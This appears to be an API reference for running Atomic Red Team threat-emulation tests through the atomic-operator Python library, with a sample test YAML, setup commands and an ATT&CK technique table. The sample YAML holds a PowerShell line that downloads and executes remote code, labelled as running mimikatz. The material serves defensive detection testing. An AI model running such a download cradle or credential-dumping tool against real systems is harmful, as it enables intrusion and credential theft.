# API Reference: Performing Threat Emulation with Atomic Red Team

## atomic-operator (Python)

```python
from atomic_operator import AtomicOperator

operator = AtomicOperator()
# Run specific technique
operator.run(
    technique="T1059.001",
    atomics_path="./atomic-red-team/atomics",
    test_numbers=[1],
)
# Run with custom inputs
operator.run(technique="T1059.001", input_arguments={"command": "whoami"})
```

## Atomic Test YAML Format

```yaml
attack_technique: T1059.001
display_name: "PowerShell"
atomic_tests:
  - name: "Mimikatz"
    description: "Downloads and runs mimikatz"
    supported_platforms: [windows]
    executor:
      name: powershell
      command: |
        IEX (New-Object Net.WebClient).DownloadString('#{url}')
      cleanup_command: |
        Remove-Item #{output_file}
    input_arguments:
      url:
        description: "URL to download"
        type: url
        default: "https://example.com/test"
```

## Key CLI Commands

```bash
# Clone atomics
git clone https://github.com/redcanaryco/atomic-red-team

# Install operator
pip install atomic-operator

# List tests for technique
ls atomic-red-team/atomics/T1059.001/
```

## Coverage Mapping

| Tactic | Example Techniques |
|--------|-------------------|
| Execution | T1059.001 (PowerShell), T1059.003 (cmd) |
| Persistence | T1053.005 (Scheduled Task), T1547.001 (Run Keys) |
| Defense Evasion | T1070.001 (Clear Event Logs) |
| Credential Access | T1003.001 (LSASS), T1558.003 (Kerberoasting) |

### References

- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
- atomic-operator: https://github.com/redcanaryco/atomic-operator
- ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
